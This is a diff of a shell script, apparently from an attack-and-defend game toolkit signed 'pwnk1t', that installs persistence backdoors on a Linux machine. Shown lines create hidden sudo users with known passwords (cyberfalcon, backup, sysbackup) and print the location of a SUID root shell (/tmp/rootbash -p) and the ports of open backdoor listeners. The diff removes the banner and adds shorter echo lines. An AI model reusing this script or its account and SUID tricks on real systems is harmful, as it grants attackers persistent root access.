@@ -35,35 +35,8 @@ echo "cyberfalcon:youguessedme" | chpasswd
 usermod -aG sudo cyberfalcon 2>/dev/null
 useradd -m -s /bin/bash backup
 echo "backup:youguessedme" | chpasswd
-
-usermod -aG sudo sysbackup 2>/dev/null
-
-echo "[+] user created -> sysbackup:Password123!"
-
-sleep 1
-
-################################
-#         END OF SCRIPT        # 
-################################
-
-echo "[+] Backdoors installed"
-sleep 0.8 
-echo "[!] -> /tmp/rootbash -p <- for suid backdoor"
-sleep 0.8
-echo "[!] Open listeners:"
-sleep 0.8
-echo -e "\033[96m[+] 1337 4444 5050 5555\033[0m"
-sleep 0.8
-echo -e "\033[96m[+] Login with sysbackup:Password123!\033[0m"
-sleep 0.8 
-echo -e "\033[96m[+] Login with $USER:Password123!\033[0m"
-sleep 0.8
-echo "[*]  clean up..."
-echo ""
-sleep 1 
-echo "[💀] created by pwnk1t [💀]"
-echo ""
-sleep 1 
-echo " 🕷️ enjoy the game 🕷️"
-sleep 1
-echo ""
+usermod -aG sudo backup 2>/dev/null 
+echo "/tmp/rootbash -p"
+echo -e "4444 5555 6666 7777"
+echo -e "cyberfalcon:youguessedme"
+echo -e "backup:youguessedme"
